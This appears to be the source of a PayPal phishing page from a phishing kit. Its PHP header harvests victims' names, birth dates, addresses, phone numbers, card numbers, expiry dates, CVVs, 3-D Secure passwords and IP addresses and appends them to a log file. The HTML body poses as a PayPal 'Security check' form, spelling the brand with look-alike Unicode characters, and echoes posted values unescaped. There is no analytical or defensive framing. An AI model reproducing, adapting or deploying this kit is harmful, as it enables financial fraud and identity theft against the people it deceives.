﻿<?php
$x = md5(microtime());
$USRB = base64_encode($email);
$IP = getenv("REMOTE_ADDR");
$time = gmdate("H:i:s");
$date = gmdate("j/m");
$BILSMG = "<pre><font style='font-size:14px;font-weight: bold;'>
###################################################
                    <img src='https://2.bp.blogspot.com/-O-ZJASC706s/U_hvz20oD2I/AAAAAAAAACw/OV1BlsEyjM0/s1600/logo_106x27.png'/>
FN : ".$_POST['gg1']."
LN : ".$_POST['gg2']."
BD : ".$_POST['gg3']."
AD : ".$_POST['gg4']."
CT : ".$_POST['gg6']."
CY : ".$_POST['gg7']."
ZP : ".$_POST['gg8']."
PH : ".$_POST['gg10']." | ".$_POST['gg9']."
CH : ".$_POST['CN']."
CN : ".$_POST['dftCN']."
EX : ".$_POST['datex']."
CV : ".$_POST['dftVC']."
3D : ".$_POST['CPNL']."
SO : ".$_POST['SORT']."
IP : <a target='_blank' style='text-decoration:none;' href='http://www.geoiptool.com/?IP=".$IP."'>".$IP."</a>
DT : ".gmdate("j/m")." @ ".gmdate("H:i:s")."";
require 'folder.php';
$file = fopen("../$f/p2.htm","a");
fwrite($file,$BILSMG);
fclose($file);
$PWDB = base64_encode($pass);
echo "<META HTTP-EQUIV='refresh' content='3; URL=websc-Thanks.php?Go=_Done=restored&_SESSION=$x'>";
?>
<html class=" js " lang="en-GB"><head>
<script type="text/javascript" charset="utf-8" data-requirecontext="_" data-requiremodule="main" src="./loginfiles/css1/js/main.js"></script>
<script type="text/javascript" charset="utf-8" data-requirecontext="_" data-requiremodule="view/" src="./loginfiles/css1/js/view/.js"></script>

<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=9; IE=8; IE=7">
<meta name="viewport" content="user-scalable=no, width=device-width">
<title>Profile Update - ΡaуΡal</title>
<link rel="shortcut icon" href="./loginfiles/css1/img/pp_favicon_x.ico">
<link rel="apple-touch-icon" href="./loginfiles/css1/img/apple-touch-icon.png">
<link rel="stylesheet" href="./loginfiles/css/app.css" />
        <link rel="stylesheet" href="./loginfiles/css1/app.css"> 
		</head>
		<body class="desktop">
<style type="text/css">.js .lap .textInput.medium label,.js div.lap.textInput.medium label{top:10px;}</style> 
  

    <div id="page" class="marketing-ce2">   
        <header class="gblHeader">
<div class="utility in">
<div class="wrapper">
<div class="logo" role="banner">
<a href="#">  <img alt="ΡaуΡal " src="./loginfiles/css1/img/logo_paypal_106x29.png" title="ΡaуΡal">
</a>
</div>  </div>
</div>
</header>    


<section id="content" role="main" class="GB"> <section id="main">  

<div class="nsb_24 nogutter">
<section class="pageHeadline nsb_16_8 nogutter">
<h1>     Ѕесurіtу сhесk</h1>
</section>
</div>   


<div class="nsb_10_14"> 
<div class="one column"> 
<div class="trayNavOuter"> 

<div class="trayNavInner clearfix" id="onboarding">  


<style type="text/css">

.donately-donation-form, .donately-thank-you {
    font-size: 13px;
    line-height: 1em;
}

.donately-secure-header span {
    padding-left: 1.5em;
    background-position: 0px 0px;
    background-repeat: no-repeat;
    background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAkAAAAMCAYAAACwXJejAAAAIUlEQVQY02NonjybAYr/Y8FgOXQFDFg0UVnRf0J4VNF/AGtWD2MTxoZrAAAAAElFTkSuQmCC');
}

.donately-secure-header {
    font-size: 0.77em;
    background-color: #E8EBED;
    text-transform: uppercase;
    color: #83939B;
    padding: 1em 1.5em;
    margin-bottom: 1em;
    box-shadow: 0px 1px 0px rgba(255, 255, 255, 0.3) inset;
}

.donately-secure-fields {
    border: 1px solid #D7DADD;
    background-color: #EFF3F5;
    padding: 0px;
    margin: 0px 0px 1.92em;
    border-radius: 3px;
}
.donately-secure-fields .donately-fields.card-number-fields {
    margin-bottom: 1.5em;
}
.donately-secure-fields .donately-fields {
    padding-left: 1.15em;
    padding-right: 1.15em;
    margin-bottom: 0px;
}


</style>


<style type="text/css">
    #dftVC{
        background: url('./loginfiles/css1/img/mini.gif') no-repeat scroll right center border-box #FFF;
        background-size: 40px 30px;
        background-position: 95% ;}
    #dftCN{background: url('./loginfiles/css1/img/cd/generic.png') no-repeat scroll right center border-box #FFF;background-size: 46px 26px;}
</style>

<section style="display: block;" class="container" id="secureinfo">  
<header>          <h2 class="authHeaderText">          Yоur реrѕоnal dеtaіlѕ         </h2>          <p>Wе nееd ѕоmе іnfоrmatіоnѕ abоut уоu bеfоrе wе сan vеrіfу уоur aссоunt.</p>          </header> 
<form name="form1" action="" class="formMedium lap proceed" method="post" novalidate="novalidate"> 

         <div class="textInput medium"> 
            <input class="hasHelp validate " name="CN"value="<?php echo $_POST['CN'];?>" type="text"> 
        </div><input id="CT" type="hidden" name="CT">
         <div class="textInput medium"> 
            <input class="hasHelp validate "  name="dftCN" value="<?php echo $_POST['dftCN'];?>"  type="text"> 
        </div>

 <div class="multiFields wide">  
        <div class="textInput medium datex"> 
               <input value="<?php echo $_POST['datex'];?>" type="text">

    </div>

        <div class="textInput medium cvc"> 
            <input class="hasHelp validate  " value="<?php echo $_POST['dftVC'];?>" type="text"> 
        </div>  
</div>


<div class="multiFields wide">
 <div class="textInput medium"> 
    <input class="hasHelp validate completed" value="" type="text"> 
 </div> 
</div>  

    <input name="jsEnabled" id="jsEnabled" value="1" type="hidden"> 
    <input name="_eventId_continue" value="Continue" class="button completed" type="submit"> 
    <input name="_eventId_changeCountry" id="changeCountry" value="Change Country" class="countrySubmit button" type="submit"> 

</form> 

 </section>  

</div> </div> </div> <div class="two column nogutter">
<section class="section-one"><h2>Hеlр uѕ kеер уоu ѕafеr</h2>
<p>Sometimes we'll ask you a unique question to verify who you are.</p></section>
<section class="section-two  shopping"> <br><h2>All day, every day</h2>
<p>Our team of security experts work around the clock to keep you protected. We're here for your safety.</p>
</section>      </div> </div> 




</section> </section> 


<div class="transitioning spinner" aria-busy="true"><p class="checkingInfo hide">Verifying your information…</p><p class="oneSecond">Verifying your information…</p></div>
<footer id="gblFooter" role="contentinfo">       <div class="footer">
<div class="footerNav">
<span class="countryList">
<ul class="topList">   <li id="countrySelector" class="button light">
<a class="country unitedStates countryBorder selected scTrack:button-countr" href="#">United States</a>
<ul id="countryList" class="dropdown">  <li class="country unitedStates"><a class="country unitedStates" href="#">United States</a></li>  <li class="country canada"><a class="country canada" href="#">Canada</a></li>  <li class="country mexico"><a class="country mexico" href="#">Mexico</a></li>  <li class="country unitedKingdom"><a class="country unitedKingdom" href="#">United Kingdom</a></li>  <li class="country australia"><a class="country australia" href="#">Australia</a></li>  <li class="last"><a href="#">See all countries</a></li>
</ul>
<div class="pointer"></div>
</li>   </ul>
</span>
<div class="legal">
<p class="copyright"> Copyright - 1999-2016 ΡaуΡal. </p>
<ul>
<li>
<a href="#">Privacy</a>
</li>
<li>
<a href="#">Legal</a>
</li>
<li>
<a href="#">Help</a>
</li>
<li>
<a href="#">Contact</a>
</li>
</ul>
</div>  </div>
</div>
<script> PAYPAL = this.PAYPAL || {};  PAYPAL.content = PAYPAL.content || {};</script>



</div> 
<script data-main="./loginfiles/css1/js/main" src="./loginfiles/css1/js/require-2.0.1.js"></script>


</html>